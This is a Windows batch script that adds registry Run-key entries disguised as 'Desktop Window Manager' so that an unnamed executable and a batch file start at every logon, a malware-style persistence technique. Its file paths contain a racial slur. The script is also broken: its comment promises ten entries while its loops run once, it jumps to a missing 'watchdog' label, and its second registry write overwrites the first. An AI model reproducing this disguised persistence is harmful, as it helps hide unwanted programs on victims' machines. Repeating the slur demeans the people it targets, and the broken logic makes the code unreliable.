@echo off
setlocal

:: === CONFIGURATION ===
set "EXEPATH=C:\Users\%USERNAME%\Downloads\nigger\Release\WindowsFormsApp1.exe"
set "PROCESSNAME=WindowsFormsApp1.exe"
set "EXE=C:\Users\%USERNAME%\AppData\nigger.bat"
:: === ADD 10 STARTUP ENTRIES ===
for /L %%i in (1,1,1) do (
    set "APPNAME=Desktop Window Manager%%i"
    call :addStartup "%%APPNAME%%"
)
for /L %%i in (1,1,1) do (
    set "APPNAME=Desktop Window Manager%%i"
    call :addStartup "%%APPNAME%%"
)

echo All startup entries added. Starting monitoring...
timeout /t 2 >nul

timeout /t 5 >nul
goto watchdog

exit /b

:addStartup
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%~1" /t REG_SZ /d "\"%EXEPATH%\"" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%~1" /t REG_SZ /d "\"%EXE%\"" /f >nul
exit /b
